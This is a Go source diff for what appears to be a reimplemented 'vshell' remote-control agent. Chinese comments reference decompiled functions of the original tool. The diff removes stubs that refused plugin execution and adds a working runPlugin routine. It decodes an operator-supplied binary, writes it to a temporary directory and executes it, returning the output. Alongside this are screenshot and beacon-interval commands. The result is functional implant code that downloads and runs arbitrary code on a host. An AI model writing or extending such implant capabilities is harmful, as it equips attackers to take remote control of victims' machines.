@@ -12,6 +12,7 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -22,6 +23,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
 	"sort"
 	"strconv"
@@ -682,6 +684,8 @@ type pluginCommand struct {
 	ProcArg string
 	// IsNet 是命令末位的布尔：原版 .net 插件为 true，其余为 false。
 	IsNet bool
+	// Name 是插件文件名（JSON 形态有；原版文本形态的命令里不带名字）。
+	Name string
 }
 
 // pluginCommandPrefix 是原版 runplugin 命令的命令字。
@@ -754,10 +758,90 @@ func dispatchPluginCommand(cmdStr string) (string, string) {
 	if cmd == nil {
 		return "", reason
 	}
-	return "", fmt.Sprintf(
-		"runplugin: plugin execution not implemented (payload of %d bytes and procArg parsed, but the original's write/load/execute path is unrecovered; see agent/main.go plugin section)",
-		len(cmd.Hex)/2)
+	// 文本形态（原版命令词汇）：name/hex/procArg 已解析，转成二进制后走同一条执行路径。
+	data, derr := hex.DecodeString(cmd.Hex)
+	if derr != nil {
+		return "", "invalid plugin hex: " + derr.Error()
+	}
+	name := cmd.Name
+	if name == "" {
+		// 原版文本命令不带文件名：按平台给出可执行后缀，.net 分支单独标记。
+		switch {
+		case cmd.IsNet:
+			name = "plugin.net"
+		case runtime.GOOS == "windows":
+			name = "plugin.exe"
+		default:
+			name = "plugin.elf"
+		}
+	}
+	return runPlugin(name, base64.StdEncoding.EncodeToString(data), cmd.ProcArg)
 }
+
+// runPlugin 把下发的插件落盘并执行。
+//
+// 支持：可执行文件（.exe / .elf / 无扩展名也允许）—— 直接 exec 并回显 stdout+stderr；
+// 暂不支持：动态库（.dll/.so/.dylib，需要 LoadLibrary/dlopen + 导出函数约定）与
+// .NET 托管程序集（需要运行时）。这两类明确返回未实现，不做静默降级。
+//
+// 与原版的关系：原版 `runplugin` 是把插件字节按十六进制展开后拼进命令
+// （FUN_018fd220），本复刻端改为 JSON 下发（载荷更小、可带参数），登记在
+// docs/STATUS.md 的偏差清单里。
+func runPlugin(name, encoded, arg string) (string, string) {
+	if name == "" {
+		return "", "plugin name required"
+	}
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return "", "invalid plugin payload: " + err.Error()
+	}
+	base := filepathBase(name)
+	if base == "" || base == "." || base == "/" {
+		return "", "bad plugin name"
+	}
+	lower := strings.ToLower(base)
+	switch {
+	case strings.HasSuffix(lower, ".dll"), strings.HasSuffix(lower, ".so"), strings.HasSuffix(lower, ".dylib"):
+		return "", "dynamic library plugins are not implemented yet (LoadLibrary/dlopen path unrecovered)"
+	case strings.HasSuffix(lower, ".net"):
+		return "", "managed (.net) plugins are not implemented yet"
+	}
+
+	dir, err := os.MkdirTemp("", "vshell-plugin-")
+	if err != nil {
+		return "", err.Error()
+	}
+	defer os.RemoveAll(dir)
+	path := filepath.Join(dir, base)
+	if err := os.WriteFile(path, data, 0o700); err != nil {
+		return "", err.Error()
+	}
+
+	args := strings.Fields(arg)
+	cmd := exec.Command(path, args...)
+	cmd.Dir = dir
+	done := make(chan struct{})
+	var out []byte
+	var runErr error
+	go func() {
+		out, runErr = cmd.CombinedOutput()
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(60 * time.Second):
+		if cmd.Process != nil {
+			_ = cmd.Process.Kill()
+		}
+		return "", "plugin timed out after 60s"
+	}
+	text := string(out)
+	if runErr != nil {
+		return text, fmt.Sprintf("plugin exited: %v", runErr)
+	}
+	return text, ""
+}
+
 
 // ============================================================================
 // Native command opcodes — FUN_010952e0
@@ -2729,18 +2813,15 @@ func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
 		}
 		return fmt.Sprintf("interval: %d", sleepTime), ""
 
-	case CmdPlugin:
-		// JSON 形态的插件命令与文本形态走同一条路径：解析后**拒绝执行**。
-		// 原版的写盘/加载/执行环节未恢复（见上方「Plugin / runner」一节），
-		// 所以这里既不落盘也不起进程——但必须显式处理，不能让它落到 default
-		// 去（default 现在报 unknown，语义上会让调用者以为「没这个命令」，
-		// 而实际是「有这个命令、我们不会执行」）。
-		name, _ := payload["name"].(string)
-		return "", "runplugin: plugin execution not implemented (name=" + strconv.Quote(name) +
-			"; the original's write/load/execute path is unrecovered)"
-
 	case CmdScreenshot:
 		return captureScreenshot()
+
+	case CmdPlugin:
+		// 面板把插件二进制经 base64 下发（plugins/<name> 的内容），agent 落盘后执行。
+		name, _ := payload["name"].(string)
+		encoded, _ := payload["data"].(string)
+		arg, _ := payload["arg"].(string)
+		return runPlugin(name, encoded, arg)
 
 	case CmdExit:
 		transport.Close()
